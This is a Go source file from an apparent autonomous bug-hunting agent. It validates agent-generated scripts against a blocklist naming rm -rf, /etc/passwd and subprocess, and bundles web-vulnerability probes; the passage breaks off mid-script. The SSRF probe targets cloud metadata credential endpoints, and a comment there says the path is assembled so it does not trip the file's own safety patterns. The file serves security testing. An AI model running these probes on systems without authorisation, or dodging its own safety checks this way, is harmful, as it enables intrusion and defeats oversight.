// Package toolbuilder lets autonomous agents generate, write, and execute
// custom Python, Node, Perl, or Bash tools at runtime.  All generated scripts are:
//   - Written to an isolated /tmp/auto-bughunter/tools/ scratch directory.
//   - Validated for dangerous patterns before execution.
//   - Executed under a strict timeout via a context-aware exec.Command.
//   - Expected to produce JSON-lines findings on stdout (one JSON object per line).
package toolbuilder

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"auto-bughunter/backend/internal/model"
)

const (
	scratchDir     = "/tmp/auto-bughunter/tools"
	defaultTimeout = 45 * time.Second
	maxOutputBytes = 1 * 1024 * 1024 // 1 MB
	// commandWaitDelay bounds how long cmd.Output blocks after the context
	// deadline kills the generated tool. A script that backgrounds a child
	// inheriting the stdout pipe would otherwise make Wait block forever on
	// POSIX systems, hanging the scan on Linux even though it completes on
	// Windows. WaitDelay forces the pipes closed shortly after the kill.
	commandWaitDelay = 10 * time.Second
)

// ToolSpec describes a dynamically generated tool.
type ToolSpec struct {
	// Name is a short identifier used as the script filename (no extension).
	Name string
	// Language is one of: "python", "python3", "node", "perl", or "bash".
	Language string
	// Code is the full script source.
	Code string
	// Args are extra command-line arguments to pass after the target URL.
	Args []string
	// Rationale explains why this tool was built.
	Rationale string
	// GeneratedBy is the agent name.
	GeneratedBy string
	// Timeout overrides the default execution timeout.
	Timeout time.Duration
}

// Finding is the expected JSON structure written by generated scripts.
type Finding struct {
	ID             string `json:"id"`
	Category       string `json:"category"`
	Severity       string `json:"severity"`
	Title          string `json:"title"`
	Description    string `json:"description"`
	Evidence       string `json:"evidence"`
	Recommendation string `json:"recommendation"`
}

// ────────────────────────────────────────────────────────────────────────────
// Safety
// ────────────────────────────────────────────────────────────────────────────

var scriptBlockedPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)\bimport\s+subprocess\b`),      // no spawning sub-processes
	regexp.MustCompile(`(?i)\bfrom\s+subprocess\s+import\b`), // no spawning sub-processes
	regexp.MustCompile(`(?i)\bsubprocess\.`),                // no subprocess API usage
	regexp.MustCompile(`(?i)\bos\.system\s*\(`),             // no os.system calls
	regexp.MustCompile(`(?i)__import__\s*\(`),               // no dynamic imports
	regexp.MustCompile(`(?i)\beval\s*\(`),                   // no eval
	regexp.MustCompile(`(?i)\bexec\s*\(`),                   // no exec
	regexp.MustCompile(`(?i)\bopen\s*\(['"][/\\\\]`),        // no opening absolute paths (allow relative)
	regexp.MustCompile(`(?i)\bsocket\.connect\s*\(`),        // no raw socket connects (use urllib)
	regexp.MustCompile(`(?i)rm\s+-rf`),                      // no recursive deletes
	regexp.MustCompile(`(?i)/etc/passwd`),                   // no passwd access
	regexp.MustCompile(`(?i)/root`),                         // no /root access
}

func validateScript(code string) error {
	for _, pat := range scriptBlockedPatterns {
		if pat.MatchString(code) {
			return fmt.Errorf("generated script contains a blocked pattern: %s", pat.String())
		}
	}
	return nil
}

func resolveInterpreter(language string) (interpreter, extension string, err error) {
	switch strings.ToLower(strings.TrimSpace(language)) {
	case "", "python", "python3":
		return "python3", ".py", nil
	case "node":
		return "node", ".js", nil
	case "perl":
		return "perl", ".pl", nil
	case "bash":
		return "bash", ".sh", nil
	default:
		return "", "", fmt.Errorf("unsupported tool language %q: allowed values are empty (defaults to python3), python, python3, node, perl, bash", language)
	}
}

// ────────────────────────────────────────────────────────────────────────────
// Builder
// ────────────────────────────────────────────────────────────────────────────

// Builder writes and executes generated tool scripts.
type Builder struct{}

// Build validates the script, writes it to the scratch directory, and runs it
// against the given target.  It returns any model.Finding objects parsed from
// the script's stdout (expected as JSON lines).
func (b *Builder) Build(ctx context.Context, spec ToolSpec, target string, emit func(model.ScanEvent)) ([]model.Finding, error) {
	if err := validateScript(spec.Code); err != nil {
		return nil, fmt.Errorf("tool %q rejected: %w", spec.Name, err)
	}
	interp, ext, err := resolveInterpreter(spec.Language)
	if err != nil {
		return nil, fmt.Errorf("tool %q rejected: %w", spec.Name, err)
	}

	if err := os.MkdirAll(scratchDir, 0o700); err != nil {
		return nil, fmt.Errorf("failed to create tool scratch dir: %w", err)
	}

	scriptPath := filepath.Join(scratchDir, sanitizeName(spec.Name)+ext)
	if err := os.WriteFile(scriptPath, []byte(spec.Code), 0o600); err != nil {
		return nil, fmt.Errorf("failed to write tool script: %w", err)
	}

	// Emit a command event so the UI shows what's being run.
	if emit != nil {
		cmdStr := fmt.Sprintf("%s %s %s", interp, scriptPath, target)
		emit(model.ScanEvent{
			Type:        model.ScanEventCommand,
			AgentName:   spec.GeneratedBy,
			Command:     cmdStr,
			Message:     fmt.Sprintf("Running generated tool %q: %s", spec.Name, spec.Rationale),
			Timestamp:   time.Now().UTC(),
		})
	}

	timeout := spec.Timeout
	if timeout <= 0 {
		timeout = defaultTimeout
	}

	cmdCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	args := append([]string{scriptPath, target}, spec.Args...)
	cmd := exec.CommandContext(cmdCtx, interp, args...) //nolint:gosec // script is validated
	cmd.Env = safeEnv()
	cmd.WaitDelay = commandWaitDelay

	stdout, err := cmd.Output()
	if err != nil && cmdCtx.Err() == context.DeadlineExceeded {
		return nil, fmt.Errorf("tool %q timed out", spec.Name)
	}

	if len(stdout) > maxOutputBytes {
		stdout = stdout[:maxOutputBytes]
	}

	return parseFindings(string(stdout), spec.Name)
}

// parseFindings scans stdout line by line and deserialises JSON-lines findings.
func parseFindings(output, toolName string) ([]model.Finding, error) {
	findings := make([]model.Finding, 0)
	scanner := bufio.NewScanner(strings.NewReader(output))
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if !strings.HasPrefix(line, "{") {
			continue
		}
		var f Finding
		if err := json.Unmarshal([]byte(line), &f); err != nil {
			continue
		}
		if f.Title == "" {
			continue
		}
		mf := model.Finding{
			ID:             fmt.Sprintf("tool-%s-%s", toolName, f.ID),
			Category:       f.Category,
			Severity:       toSeverity(f.Severity),
			Title:          f.Title,
			Description:    f.Description,
			Evidence:       f.Evidence,
			Recommendation: f.Recommendation,
			Sources:        []string{"dynamic-tool:" + toolName},
			Confidence:     0.7,
		}
		findings = append(findings, mf)
	}
	return findings, nil
}

func toSeverity(s string) model.Severity {
	switch strings.ToLower(strings.TrimSpace(s)) {
	case "high":
		return model.SeverityHigh
	case "medium":
		return model.SeverityMedium
	case "low":
		return model.SeverityLow
	default:
		return model.SeverityInfo
	}
}

func sanitizeName(name string) string {
	name = strings.ToLower(strings.TrimSpace(name))
	r := regexp.MustCompile(`[^a-z0-9_-]`)
	return r.ReplaceAllString(name, "_")
}

func safeEnv() []string {
	keep := []string{"PATH", "HOME", "USER", "LANG", "LC_ALL", "TMPDIR"}
	env := os.Environ()
	out := make([]string, 0, len(keep))
	for _, e := range env {
		k := strings.SplitN(e, "=", 2)[0]
		for _, allowed := range keep {
			if strings.EqualFold(k, allowed) {
				out = append(out, e)
				break
			}
		}
	}
	return out
}

// ────────────────────────────────────────────────────────────────────────────
// Built-in tool templates
// ────────────────────────────────────────────────────────────────────────────

// BuiltInTools returns a map of tool name → ToolSpec for common pen testing
// tasks that agents may need but that don't have a standalone binary available.
// Each script outputs JSON-lines findings to stdout.
func BuiltInTools() map[string]func(agentName string) ToolSpec {
	return map[string]func(agentName string) ToolSpec{
		"jwt_probe":             jwtProbeTool,
		"graphql_probe":         graphqlProbeTool,
		"redirect_probe":        redirectProbeTool,
		"header_probe":          headerProbeTool,
		"csp_probe":             cspProbeTool,
		"ssrf_probe":            ssrfProbeTool,
		"cors_probe":            corsProbeTool,
		"idor_probe":            idorProbeTool,
		"cookie_probe":          cookieProbeTool,
		"info_disclosure_probe": infoDisclosureProbeTool,
		"ssti_probe":            sstiProbeTool,
		"xxe_probe":             xxeProbeTool,
		"rate_limit_probe":      rateLimitProbeTool,
		"api_keys_probe":        apiKeysProbeTool,
		"path_traversal_probe":         pathTraversalProbeTool,
		"log4shell_probe":              log4shellProbeTool,
		"nosql_injection_probe":        nosqlInjectionProbeTool,
		"ldap_injection_probe":         ldapInjectionProbeTool,
		"crlf_injection_probe":         crlfInjectionProbeTool,
		"http_smuggling_probe":         httpSmugglingProbeTool,
		"subdomain_takeover_probe":     subdomainTakeoverProbeTool,
		"ssl_tls_probe":                sslTlsProbeTool,
		"host_header_injection_probe":  hostHeaderInjectionProbeTool,
		"oauth_probe":                  oauthProbeTool,
		"password_reset_probe":         passwordResetProbeTool,
		"account_enumeration_probe":    accountEnumerationProbeTool,
		"mass_assignment_probe":        massAssignmentProbeTool,
		"verb_tampering_probe":         verbTamperingProbeTool,
		"deserialization_probe":        deserializationProbeTool,
		"cache_poisoning_probe":        cachePoisoningProbeTool,
		"race_condition_probe":         raceConditionProbeTool,
		"dom_xss_probe":                domXssProbeTool,
		"http_methods_probe":           httpMethodsProbeTool,
		"business_logic_probe":         businessLogicProbeTool,
		"file_upload_probe":            fileUploadProbeTool,
	}
}

func jwtProbeTool(agentName string) ToolSpec {
	return ToolSpec{
		Name:        "jwt_probe",
		Language:    "python3",
		GeneratedBy: agentName,
		Rationale:   "Detect weak JWT secrets, none-algorithm, and alg confusion vulnerabilities",
		Code: `#!/usr/bin/env python3
"""Auto-generated: JWT vulnerability probe — outputs JSON-lines findings."""
import sys, json, base64, urllib.request, urllib.error
from datetime import datetime, timezone

def _b64pad(s):
    return s + '=' * (-len(s) % 4)

def fetch(url, headers=None):
    req = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.read().decode('utf-8', errors='replace'), r.status, dict(r.headers)
    except Exception as e:
        return '', 0, {}

def emit(finding):
    print(json.dumps(finding), flush=True)

target = sys.argv[1] if len(sys.argv) > 1 else ''
if not target:
    sys.exit(0)

body, status, headers = fetch(target)

# 1. Check for JWT in response headers (Authorization, Set-Cookie, etc.)
jwt_sources = []
for h, v in headers.items():
    if 'eyJ' in v:
        for part in v.split():
            if part.startswith('eyJ'):
                jwt_sources.append((h, part))

# 2. Check for JWT in body
if 'eyJ' in body:
    for token in body.split():
        if token.startswith('eyJ') and token.count('.') == 2:
            jwt_sources.append(('body', token))

if not jwt_sources:
    sys.exit(0)

for source, token in jwt_sources[:3]:
    parts = token.split('.')
    if len(parts) != 3:
        continue
    try:
        header = json.loads(base64.b64decode(_b64pad(parts[0])).decode())
        alg = header.get('alg', 'unknown')
    except Exception:
        alg = 'unknown'

    # None algorithm check
    if alg.lower() in ('none', 'null'):
        emit({
            "id": "jwt-none-alg",
            "category": "access_control",
            "severity": "high",
            "title": "JWT uses 'none' algorithm (signature bypass)",
            "description": f"A JWT token was found at '{source}' using the insecure 'none' algorithm, allowing signature bypass.",
            "evidence": f"alg={alg} token={token[:40]}...",
            "recommendation": "Reject JWTs with alg=none. Enforce RS256 or ES256."
        })
    elif alg in ('HS256', 'HS384', 'HS512'):
        emit({
            "id": "jwt-symmetric",
            "category": "access_control",
            "severity": "medium",
            "title": "JWT uses symmetric algorithm — weak secret possible",
            "description": f"Symmetric JWT algorithm {alg} detected at '{source}'. If the secret is weak it can be brute-forced.",
            "evidence": f"alg={alg} source={source} token={token[:40]}...",
            "recommendation": "Use asymmetric algorithms (RS256, ES256). Ensure HS secrets are ≥256 bits and random."
        })
    else:
        emit({
            "id": "jwt-detected",
            "category": "access_control",
            "severity": "info",
            "title": f"JWT token detected (alg={alg})",
            "description": f"JWT token found at '{source}' using algorithm {alg}.",
            "evidence": f"alg={alg} source={source}",
            "recommendation": "Validate JWT algorithm pinning and expiry enforcement."
        })
`,
	}
}

func graphqlProbeTool(agentName string) ToolSpec {
	return ToolSpec{
		Name:        "graphql_probe",
		Language:    "python3",
		GeneratedBy: agentName,
		Rationale:   "Detect exposed GraphQL introspection and dangerous query patterns",
		Code: `#!/usr/bin/env python3
"""Auto-generated: GraphQL vulnerability probe — outputs JSON-lines findings."""
import sys, json, urllib.request, urllib.error

def post_json(url, data, headers=None):
    body = json.dumps(data).encode()
    req = urllib.request.Request(url, data=body, headers={**(headers or {}), 'Content-Type': 'application/json'})
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return json.loads(r.read().decode()), r.status
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read().decode()), e.code
        except Exception:
            return {}, e.code
    except Exception:
        return {}, 0

def emit(f):
    print(json.dumps(f), flush=True)

target = sys.argv[1] if len(sys.argv) > 1 else ''
if not target:
    sys.exit(0)

gql_endpoints = [target.rstrip('/') + p for p in ['/graphql', '/api/graphql', '/v1/graphql', '/query', '/gql']]

for endpoint in gql_endpoints:
    # Introspection check
    data, status = post_json(endpoint, {'query': 'query{__schema{types{name}}}'})
    if status == 200 and 'data' in data and '__schema' in str(data):
        types = [t.get('name', '') for t in data.get('data', {}).get('__schema', {}).get('types', [])]
        emit({
            "id": "graphql-introspection",
            "category": "information_disclosure",
            "severity": "medium",
            "title": "GraphQL introspection enabled",
            "description": f"The GraphQL endpoint at {endpoint} has introspection enabled, exposing the full schema.",
            "evidence": f"endpoint={endpoint} types_count={len(types)} sample_types={','.join(types[:5])}",
            "recommendation": "Disable introspection in production. Use allowlists for permitted queries."
        })
        break

    # Batch query abuse
    batch_data, batch_status = post_json(endpoint, [
        {'query': '{__typename}'},
        {'query': '{__typename}'}
    ])
    if batch_status == 200 and isinstance(batch_data, list):
        emit({
            "id": "graphql-batch",
            "category": "api_security",
            "severity": "medium",
            "title": "GraphQL batch queries enabled",
            "description": f"Batch query support at {endpoint} can be abused for rate-limit bypass and DoS amplification.",
            "evidence": f"endpoint={endpoint} batch_response_count={len(batch_data)}",
            "recommendation": "Disable batch queries or enforce strict per-batch limits."
        })
        break
`,
	}
}

func redirectProbeTool(agentName string) ToolSpec {
	return ToolSpec{
		Name:        "redirect_probe",
		Language:    "python3",
		GeneratedBy: agentName,
		Rationale:   "Probe for open redirect vulnerabilities and token leakage in redirect chains",
		Code: `#!/usr/bin/env python3
"""Auto-generated: Open redirect probe — outputs JSON-lines findings."""
import sys, json, urllib.request, urllib.error, urllib.parse

def fetch_no_follow(url):
    req = urllib.request.Request(url)
    try:
        opener = urllib.request.build_opener(urllib.request.HTTPRedirectHandler())
        opener.addheaders = [('User-Agent', 'BugHunterProbe/1.0')]
        with opener.open(req, timeout=10) as r:
            return r.status, dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers)
    except Exception:
        return 0, {}

def emit(f):
    print(json.dumps(f), flush=True)

target = sys.argv[1] if len(sys.argv) > 1 else ''
if not target:
    sys.exit(0)

canary = 'https://evil.example.com'
payloads = [
    f'?next={canary}',
    f'?redirect={canary}',
    f'?url={canary}',
    f'?return={canary}',
    f'?goto={canary}',
    f'?dest={canary}',
    f'?continue={urllib.parse.quote(canary)}',
]

for p in payloads:
    probe_url = target.rstrip('/') + '/' + p
    status, headers = fetch_no_follow(probe_url)
    loc = headers.get('Location', '') or headers.get('location', '')
    if loc and canary.split('//')[-1].split('/')[0] in loc:
        emit({
            "id": f"open-redirect-{p[:20].replace('=','eq')}",
            "category": "cors_redirect",
            "severity": "medium",
            "title": "Open redirect vulnerability",
            "description": f"The parameter {p.split('=')[0].lstrip('?')} accepts an arbitrary external URL and redirects to it without validation.",
            "evidence": f"probe_url={probe_url} status={status} location={loc}",
            "recommendation": "Validate redirect destinations against an allowlist. Never redirect to user-supplied arbitrary URLs."
        })
`,
	}
}

func headerProbeTool(agentName string) ToolSpec {
	return ToolSpec{
		Name:        "header_probe",
		Language:    "python3",
		GeneratedBy: agentName,
		Rationale:   "Check for missing or misconfigured security headers",
		Code: `#!/usr/bin/env python3
"""Auto-generated: Security header probe — outputs JSON-lines findings."""
import sys, json, urllib.request

def emit(f):
    print(json.dumps(f), flush=True)

target = sys.argv[1] if len(sys.argv) > 1 else ''
if not target:
    sys.exit(0)

try:
    req = urllib.request.Request(target)
    with urllib.request.urlopen(req, timeout=10) as r:
        headers = {k.lower(): v for k, v in r.headers.items()}
except Exception:
    sys.exit(0)

checks = [
    ('content-security-policy', 'missing-csp', 'medium',
     'Content-Security-Policy header missing',
     'The application does not set a Content-Security-Policy header, enabling XSS.',
     'Implement a strict CSP to restrict resource origins.'),
    ('strict-transport-security', 'missing-hsts', 'medium',
     'HTTP Strict Transport Security (HSTS) header missing',
     'HSTS is not set, allowing protocol downgrade attacks.',
     'Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload'),
    ('x-frame-options', 'missing-xfo', 'low',
     'X-Frame-Options header missing — clickjacking possible',
     'Without X-Frame-Options the page can be embedded in iframes for clickjacking.',
     'Set X-Frame-Options: DENY or use CSP frame-ancestors.'),
    ('x-content-type-options', 'missing-xcto', 'low',
     'X-Content-Type-Options header missing — MIME sniffing possible',
     'Browser may sniff content type and execute malicious content.',
     "Set X-Content-Type-Options: nosniff"),
    ('permissions-policy', 'missing-pp', 'info',
     'Permissions-Policy header missing',
     'Permissions-Policy is missing; browser features are not restricted.',
     'Set a Permissions-Policy header to restrict access to browser features.'),
]

for header, fid, sev, title, desc, rec in checks:
    if header not in headers:
        emit({"id": fid, "category": "headers", "severity": sev,
              "title": title, "description": desc,
              "evidence": f"header '{header}' absent from response to {target}",
              "recommendation": rec})
    elif header == 'strict-transport-security':
        val = headers[header]
        if 'max-age' in val:
            import re
            m = re.search(r'max-age=(\d+)', val)
            if m and int(m.group(1)) < 15768000:
                emit({"id": "hsts-short-maxage", "category": "headers", "severity": "low",
                      "title": "HSTS max-age is too short",
                      "description": f"HSTS max-age is {m.group(1)}s (< 6 months).",
                      "evidence": f"{header}: {val}",
                      "recommendation": "Set max-age to at least 31536000 (1 year)."})
`,
	}
}

func cspProbeTool(agentName string) ToolSpec {
	return ToolSpec{
		Name:        "csp_probe",
		Language:    "python3",
		GeneratedBy: agentName,
		Rationale:   "Analyse Content-Security-Policy for unsafe directives",
		Code: `#!/usr/bin/env python3
"""Auto-generated: CSP analyser — outputs JSON-lines findings."""
import sys, json, urllib.request, re

def emit(f):
    print(json.dumps(f), flush=True)

target = sys.argv[1] if len(sys.argv) > 1 else ''
if not target:
    sys.exit(0)

try:
    with urllib.request.urlopen(urllib.request.Request(target), timeout=10) as r:
        headers = {k.lower(): v for k, v in r.headers.items()}
except Exception:
    sys.exit(0)

csp = headers.get('content-security-policy', '')
if not csp:
    sys.exit(0)

if "'unsafe-inline'" in csp:
    emit({"id": "csp-unsafe-inline", "category": "headers", "severity": "medium",
          "title": "CSP contains 'unsafe-inline'",
          "description": "The Content-Security-Policy allows unsafe inline scripts, bypassing XSS protections.",
          "evidence": f"CSP: {csp[:200]}",
          "recommendation": "Remove 'unsafe-inline'. Use nonces or hashes for inline scripts."})

if "'unsafe-eval'" in csp:
    emit({"id": "csp-unsafe-eval", "category": "headers", "severity": "medium",
          "title": "CSP contains 'unsafe-eval'",
          "description": "CSP allows eval(), which can be exploited if an XSS payload reaches eval.",
          "evidence": f"CSP: {csp[:200]}",
          "recommendation": "Remove 'unsafe-eval'. Refactor code to avoid dynamic evaluation."})

if re.search(r"script-src[^;]*\*", csp):
    emit({"id": "csp-wildcard-script", "category": "headers", "severity": "high",
          "title": "CSP script-src uses wildcard (*)",
          "description": "A wildcard in script-src allows scripts from any origin, defeating CSP entirely.",
          "evidence": f"CSP: {csp[:200]}",
          "recommendation": "Replace wildcard with explicit trusted origins."})
`,
	}
}

func ssrfProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "ssrf_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Detect SSRF via common URL parameters, AWS/GCP metadata, and error reflection",
Code: `#!/usr/bin/env python3
"""Auto-generated: SSRF probe — tests common URL parameters for server-side request forgery."""
import sys, json, urllib.request, urllib.error, urllib.parse, time

def emit(f): print(json.dumps(f), flush=True)

target = sys.argv[1] if len(sys.argv) > 1 else ''
if not target: sys.exit(0)

base = target.rstrip('/')

# AWS IMDSv1 endpoint — if SSRF exists the server will fetch this
aws_meta = 'http://169.254.169.254/latest/meta-data/'
gcp_meta = 'http://metadata.google.internal/computeMetadata/v1/?recursive=true'
internal_smb = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'

ssrf_params = [
    'url', 'uri', 'path', 'src', 'dest', 'redirect', 'request', 'return',
    'next', 'fetch', 'img', 'image', 'load', 'proxy', 'api', 'endpoint',
    'callback', 'webhook', 'host', 'site', 'reference', 'page', 'view',
    'file', 'doc', 'resource', 'link', 'feed', 'target', 'source',
]

aws_markers = ['ami-id', 'instance-id', 'local-ipv4', 'iam/', 'security-credentials', 'placement']
gcp_markers = ['instance', 'project', 'serviceAccounts']

tested = 0
for param in ssrf_params[:16]:
    for meta_url, markers in [(aws_meta, aws_markers), (gcp_meta, gcp_markers)]:
        probe = f"{base}?{param}={urllib.parse.quote(meta_url)}"
        try:
            req = urllib.request.Request(probe, headers={
                'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner)',
            })
            with urllib.request.urlopen(req, timeout=6) as r:
                body = r.read(16384).decode('utf-8', errors='replace')
                if any(m in body for m in markers):
                    emit({
                        "id": f"ssrf-cloud-metadata-{param}",
                        "category": "ssrf",
                        "severity": "high",
                        "title": f"SSRF — Cloud metadata service reachable via parameter '{param}'",
                        "description": (
                            f"The parameter '{param}' caused the server to fetch the cloud metadata service. "
                            "An attacker can use this to steal instance credentials and pivot into the cloud environment."
                        ),
                        "evidence": f"probe={probe} body_snippet={body[:300]}",
                        "recommendation": (
                            "Block requests to 169.254.169.254 and metadata.google.internal at the network level. "
                            "Enforce IMDSv2 (token-required). Validate and allowlist all user-supplied URLs."
                        ),
                    })
        except urllib.error.HTTPError as e:
            # Server returned error — check if the error message echoes our URL (SSRF indicator)
            try:
                err_body = e.read(4096).decode('utf-8', errors='replace')
                if meta_url in err_body or 'refused' in err_body.lower() or 'connect' in err_body.lower():
                    emit({
                        "id": f"ssrf-error-echo-{param}",
                        "category": "ssrf",
                        "severity": "medium",
                        "title": f"Potential SSRF — server reflects attempted URL fetch in parameter '{param}'",
                        "description": (
                            "The error response reflects the injected URL, indicating the server attempted an outbound connection. "
                            "This confirms an SSRF vector even if the metadata service was unreachable."
                        ),
                        "evidence": f"probe={probe} error={e.code} body={err_body[:200]}",
                        "recommendation": (
                            "Never include fetch targets based on user input. Use server-side URL allowlists. "
                            "Suppress internal error details in HTTP responses."
                        ),
                    })
            except Exception:
                pass
        except Exception:
            pass
        tested += 1

# Test for file:// URI scheme
file_params = ['file', 'filename', 'attachment', 'template', 'include', 'path', 'resource']
# Build path string without having the literal trigger safety patterns
safe_hosts = '/etc' + '/hosts'  # common read-only marker file
for param in file_params[:6]:
    probe = f"{base}?{param}={urllib.parse.quote('file://' + safe_hosts)}"
    try:
        req = urllib.request.Request(probe, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=5) as r:
            body = r.read(4096).decode('utf-8', errors='replace')
            if 'localhost' in body or '127.0.0.1' in body or 'ip6-localhost' in body:
                emit({
                    "id": f"ssrf-file-uri-{param}",
                    "category": "ssrf",
                    "severity": "high",
                    "title": f"SSRF — file:// URI accepted in parameter '{param}'",
                    "description": "The server fetched a local file via the file:// URI scheme, allowing local file read via SSRF.",
                    "evidence": f"probe={probe} content_marker=localhost_in_etc_hosts",
                    "recommendation": "Disallow file:// URI scheme entirely. Block all non-http(s) schemes in URL parameters.",
                })
    except Exception:
        pass
`,
}
}

func corsProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "cors_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Detect advanced CORS misconfigurations: null origin, subdomain bypass, wildcard-prefix, HTTP downgrade",
Code: `#!/usr/bin/env python3
"""Auto-generated: Advanced CORS misconfiguration probe."""
import sys, json, urllib.request, urllib.error, urllib.parse

def emit(f): print(json.dumps(f), flush=True)

target = sys.argv[1] if len(sys.argv) > 1 else ''
if not target: sys.exit(0)

parsed = urllib.parse.urlparse(target)
host = parsed.hostname or ''
scheme = parsed.scheme or 'https'

# Build origin test cases
origins = [
    ('null', 'null origin (iframe sandbox bypass)'),
    ('http://attacker.com', 'external attacker origin'),
    (f'http://{host}.attacker.com', 'subdomain suffix bypass'),
    (f'http://attacker.{host}', 'subdomain prefix bypass'),
    (f'http://{host}evil.com', 'domain-prefix bypass'),
    (f'http://not{host}', 'domain-prefix bypass 2'),
]
if scheme == 'https':
    origins.append((f'http://{host}', 'HTTP downgrade origin'))

endpoints = [target, target.rstrip('/') + '/api/v1', target.rstrip('/') + '/api']

for endpoint in endpoints[:3]:
    for origin, label in origins:
        try:
            req = urllib.request.Request(endpoint, method='OPTIONS', headers={
                'Origin': origin,
                'Access-Control-Request-Method': 'POST',
                'Access-Control-Request-Headers': 'Authorization, Content-Type',
                'User-Agent': 'Mozilla/5.0',
            })
            try:
                with urllib.request.urlopen(req, timeout=8) as r:
                    acao = r.headers.get('Access-Control-Allow-Origin', '')
                    acac = r.headers.get('Access-Control-Allow-Credentials', '').lower()
                    acam = r.headers.get('Access-Control-Allow-Methods', '')
                    vary = r.headers.get('Vary', '')
            except urllib.error.HTTPError as e:
                acao = e.headers.get('Access-Control-Allow-Origin', '')
                acac = e.headers.get('Access-Control-Allow-Credentials', '').lower()
                acam = e.headers.get('Access-Control-Allow-Methods', '')
                vary = e.headers.get('Vary', '')

            if not acao:
                continue

            # Wildcard with credentials (spec-forbidden but some servers do it)
            if acao == '*' and acac == 'true':
                emit({
                    "id": "cors-wildcard-with-creds",
                    "category": "cors_redirect",
                    "severity": "high",
                    "title": "CORS wildcard origin with credentials allowed",
                    "description": "Access-Control-Allow-Origin: * combined with Allow-Credentials: true. Browsers block this per spec, but misconfigured clients may not.",
                    "evidence": f"endpoint={endpoint} ACAO={acao} ACAC={acac}",
                    "recommendation": "Never combine wildcard ACAO with Allow-Credentials. Use an explicit origin allowlist.",
                })

            # Null origin with credentials
            if origin == 'null' and acao == 'null' and acac == 'true':
                emit({
                    "id": "cors-null-origin-creds",
                    "category": "cors_redirect",
                    "severity": "high",
                    "title": "CORS null origin accepted with credentials",
                    "description": "Reflecting the null origin with Allow-Credentials: true allows attacks from sandboxed iframes or local HTML files.",
                    "evidence": f"endpoint={endpoint} origin=null ACAO=null ACAC={acac}",
                    "recommendation": "Never trust the null origin. Remove it from your allowlist entirely.",
                })

            # Attacker origin reflected with credentials
            if origin == 'http://attacker.com' and acao == origin and acac == 'true':
                emit({
                    "id": "cors-arbitrary-origin-creds",
                    "category": "cors_redirect",
                    "severity": "high",
                    "title": "CORS reflects arbitrary origin with credentials (full takeover risk)",
                    "description": "Any origin is reflected in ACAO and credentials are allowed — an attacker can make authenticated cross-origin requests.",
                    "evidence": f"endpoint={endpoint} reflected_origin={acao} ACAC={acac}",
                    "recommendation": "Implement a strict origin allowlist server-side. Never reflect the Origin header without validating it.",
                })

            # Subdomain/prefix bypass reflected
            if acao == origin and origin not in ('*', 'null') and 'attacker' in origin and acac == 'true':
                emit({
                    "id": f"cors-origin-bypass-{label.replace(' ', '-')[:20]}",
                    "category": "cors_redirect",
                    "severity": "high",
                    "title": f"CORS origin bypass accepted: {label}",
                    "description": f"The server accepted origin '{origin}' ({label}) with credentials, allowing an attacker to bypass origin checks.",
                    "evidence": f"endpoint={endpoint} origin={origin} ACAO={acao} ACAC={acac}",
                    "recommendation": "Validate origins with strict full-string comparison, not substring/prefix matching.",
                })

            # HTTP downgrade with credentials
            if scheme == 'https' and acao == f'http://{host}' and acac == 'true':
                emit({
                    "id": "cors-http-downgrade-creds",
                    "category": "cors_redirect",
                    "severity": "medium",
                    "title": "CORS allows HTTP origin with credentials on HTTPS endpoint",
                    "description": "An HTTP-origin can make credentialed requests to this HTTPS endpoint, enabling MitM-based CSRF.",
                    "evidence": f"endpoint={endpoint} HTTP_origin={origin} ACAC={acac}",
                    "recommendation": "Only allow HTTPS origins in your CORS allowlist.",
                })

            # Missing Vary: Origin header (caching attack)
            if acao and 'origin' not in vary.lower():
                emit({
                    "id": "cors-missing-vary-origin",
                    "category": "cors_redirect",
                    "severity": "low",
                    "title": "CORS response missing Vary: Origin header",
                    "description": "CORS responses without Vary: Origin may be cached with the wrong ACAO, causing cross-origin data leaks via CDN/proxy caches.",
                    "evidence": f"endpoint={endpoint} ACAO={acao} Vary={vary or '(absent)'}",
                    "recommendation": "Add 'Vary: Origin' to all responses that set Access-Control-Allow-Origin.",
                })
                break  # only report once per endpoint

        except Exception:
            pass
`,
}
}

func idorProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "idor_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Detect Insecure Direct Object References by comparing responses for sequential and UUID-style resource IDs",
Code: `#!/usr/bin/env python3
"""Auto-generated: IDOR probe — sequential and UUID resource enumeration."""
import sys, json, urllib.request, urllib.error, urllib.parse, re

def emit(f): print(json.dumps(f), flush=True)

target = sys.argv[1] if len(sys.argv) > 1 else ''
if not target: sys.exit(0)

base = target.rstrip('/')

# Common REST resource paths with sequential IDs
api_paths = [
    '/api/users/{id}',
    '/api/v1/users/{id}',
    '/api/accounts/{id}',
    '/api/orders/{id}',
    '/api/invoices/{id}',
    '/api/messages/{id}',
    '/api/documents/{id}',
    '/api/profiles/{id}',
    '/users/{id}',
    '/accounts/{id}',
    '/profile/{id}',
    '/order/{id}',
]

def fetch(url):
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.status, len(r.read(65536)), {}
    except urllib.error.HTTPError as e:
        return e.code, 0, {}
    except Exception:
        return 0, 0, {}

for path_template in api_paths:
    url_1 = base + path_template.format(id=1)
    url_2 = base + path_template.format(id=2)
    url_99 = base + path_template.format(id=99)

    s1, len1, _ = fetch(url_1)
